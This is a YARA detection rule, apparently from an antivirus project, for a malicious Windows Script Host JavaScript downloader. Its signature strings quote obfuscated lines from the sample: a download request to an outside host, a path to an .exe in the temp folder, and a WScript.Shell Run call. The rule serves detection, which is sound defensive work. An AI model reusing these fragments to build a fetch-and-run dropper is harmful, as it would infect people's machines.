rule sig_20160328_4819a2e3619bec32e41a3cf18cfd6951 {
  meta:
    description = "datamaliciousorder - file 20160328_4819a2e3619bec32e41a3cf18cfd6951.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9aeefde86f1236523bf6d6c1f3cce03bc6a0674cae716028ef40402268b2e908"

  strings:
    $s1  = "function Zwquwcibr() {return Ragcq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4UOGVK22kT.exe\";};" fullword ascii
    $s2  = "Pgocxigw[Fzfuszvz](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "function Jwsdbmtxi(Voujjwb, Axawruncp){return Voujjwb - Axawruncp;};" fullword ascii
    $s4  = "do {WScript[Hngtmali](Rpzkqgyan() * 11)} while (Pgocxigw[\"readystate\"] < 4 );" fullword ascii
    $s5  = "var Ragcq = function Fjmhv() {return WScript[Hgwap](\"WScript.Shell\");}();" fullword ascii
    $s6  = " while (Hynxbinemt){" fullword ascii
    $s7  = "function Chtgs(Yotvb){Ragcq[\"Run\"](Yotvb, Zkgfqi, Zkgfqi);};" fullword ascii
    $s8  = "function Btttfy() {return ((Kyxhlzim == true) && (Kyxhlzim == Lfhwluu)) ? 1 : Zkgfqi;};" fullword ascii
    $s9  = "function Xqkszd(Okoyvg) {var Zjhqensg = (1, 2, 3, 4, 5, Okoyvg); return Zjhqensg;};" fullword ascii
    $s10 = "var Pwlzampkae = new this[\"Date\"]();" fullword ascii
    $s11 = "Kyxhlzim = true; " fullword ascii
    $s12 = "var Lfhwluu = false;" fullword ascii
    $s13 = "var Xcbrz = false;" fullword ascii
    $s14 = "function Rpzkqgyan(){return 22;};" fullword ascii
    $s15 = "function Rnmsdbycfb()" fullword ascii
    $s16 = "function Snykje(){return Hgwap;};" fullword ascii
    $s17 = "return Jwsdbmtxi(Ooonfhspqd, Obnlrch);" fullword ascii
    $s18 = "var Kyxhlzim = false;" fullword ascii
    $s19 = "Lfhwluu = true; " fullword ascii
    $s20 = "function Tsbprdluj(){return Ciwkez;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}